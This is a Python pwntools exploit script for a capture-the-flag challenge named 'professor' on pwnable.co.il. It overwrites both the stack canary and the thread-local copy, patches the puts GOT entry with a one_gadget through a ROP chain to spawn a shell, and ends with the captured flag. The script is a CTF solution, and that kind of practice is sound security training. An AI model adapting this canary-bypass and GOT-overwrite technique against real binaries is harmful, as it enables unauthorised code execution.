from pwn import *

#gadgets
pop_rbx_rbp_r12_r13_r14_r15 = p64(0x000000000040138a)
add_ref_rbp_rbx = p64(0x00000000004011bc)# add dword ptr [rbp - 0x3d], ebx ; nop ; ret

#defines
CANARY_PADDING = 0x28
TLS_CANARY_PADDING = 0x868
NEW_CANARY = p64(0xffff_ffff_ffff_ffff)
BINSH = b"/bin/sh\x00"
ONE_GADGET_OFFSET = 0x00000000000e3b31
PUTS_OFFSET = 0x0000000000084450
PUTS_GOT_OFFSET = 0x0000000000404020
PUTS = 0x00000000004010a0

def main():
    ### run ###
    #p = process("./professor")
    p = remote("pwnable.co.il", 9003)

    ### payload start ###
    payload = CANARY_PADDING * b"\x00"
    payload += NEW_CANARY
    payload += p64(0)
    payload += pop_rbx_rbp_r12_r13_r14_r15
    payload += p64(ONE_GADGET_OFFSET - PUTS_OFFSET) #rbx
    payload += p64(PUTS_GOT_OFFSET + 0x3d)  #rbp
    payload += p64(0) #r12
    payload += p64(0) #r13
    payload += p64(0) #r14
    payload += p64(0) #r15
    payload += add_ref_rbp_rbx
    payload += p64(PUTS)
    payload += (TLS_CANARY_PADDING - len(payload)) * b"\x00"
    payload += NEW_CANARY
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()

#flag: PWNIL{who_knew_the_tls_was_stored_on_the_stack?_not_me...}